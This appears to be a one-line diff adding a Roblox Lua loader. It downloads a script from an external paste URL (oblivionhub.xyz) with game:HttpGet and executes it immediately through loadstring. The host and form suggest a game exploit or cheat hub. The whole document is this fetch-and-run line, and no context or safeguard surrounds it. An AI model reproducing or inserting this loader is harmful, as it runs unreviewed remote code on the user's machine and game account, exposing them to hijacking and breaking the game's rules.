@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://oblivionhub.xyz/api/paste?id=24085247bc3673521de44b9e954e3b09&raw=true"))()
